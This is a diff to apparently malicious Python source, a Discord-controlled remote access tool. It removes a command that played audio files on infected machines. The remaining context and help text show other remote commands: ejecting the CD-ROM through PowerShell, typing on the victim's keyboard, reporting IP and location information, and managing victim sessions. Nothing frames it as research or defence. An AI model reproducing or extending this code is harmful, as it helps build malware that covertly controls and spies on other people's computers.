@@ -12,7 +12,6 @@ import base64
 import codecs
 import pyperclip
 from subprocess import call
-from playsound import playsound
 
 while True:
     try:
@@ -306,16 +305,6 @@ while True:
                     call("powershell -Command (New-Object -com 'WMPlayer.OCX').cdromcollection.item(0).Eject()", shell=True)
 
         @bot.command()
-        async def audio(ctx, session, path):
-            if session == "all":
-                thread = threading.Thread(target=soundplay, args=(path,)) 
-                thread.start()
-            else:
-                if session == sesja:
-                    thread = threading.Thread(target=soundplay, args=(path,)) 
-                    thread.start()
-        
-        @bot.command()
         async def sesje(ctx):
             await ctx.send(sesja + " is the session ip address: " + ipaddres)
         
@@ -346,7 +335,6 @@ while True:
 !write [session] [message] - Types using the keyboard.
 !loc [session] - Displays IP information.
 !cdrom [session] - Opens the CD-ROM drive.
-!audio [session] [file_name] - Plays an audio file.
 !sessions - Displays all sessions.
 !rename [session] [new_name] - Changes the name of a session.
             '''
